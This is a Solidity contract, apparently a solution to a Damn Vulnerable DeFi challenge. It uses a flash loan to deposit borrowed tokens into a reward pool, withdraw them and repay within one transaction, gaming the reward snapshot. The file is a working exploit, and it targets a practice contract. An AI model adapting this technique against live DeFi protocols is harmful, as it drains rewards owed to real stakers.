//SPDX-License-Identifier:MIT
pragma solidity ^0.8.7;
import "hardhat/console.sol";

interface IFlashLoanPool{
    function flashLoan(uint256 amount) external;
}
interface IRewardPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
}

interface IDamnValuableToken{
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool); 
}



contract RewardAttacker {

    IRewardPool rewardPool;
    IDamnValuableToken dmvToken;

    address flashLoanPool;
    constructor ( address _flashPool, address _rewardPool, address _dmvToken) {
        rewardPool = IRewardPool(_rewardPool);
        flashLoanPool = _flashPool;
        dmvToken = IDamnValuableToken(_dmvToken);
    }

    function receiveFlashLoan(uint256 amount) public {

        // give permission to reward pool
        dmvToken.approve(address(rewardPool), amount);

        // stake dmv tokens borrowed from flash loan into the reward pool contract
        rewardPool.deposit(amount);

        // withdraw dmv tokens from reward pool
        rewardPool.withdraw(amount);

        // here I repay the flash loan
        bool success = dmvToken.transfer(flashLoanPool, amount);
        require(success, "dmv token repayment to flash pool failed");
    }

    function exploit(uint256 amount) external {
        IFlashLoanPool(flashLoanPool).flashLoan(amount);
    }
}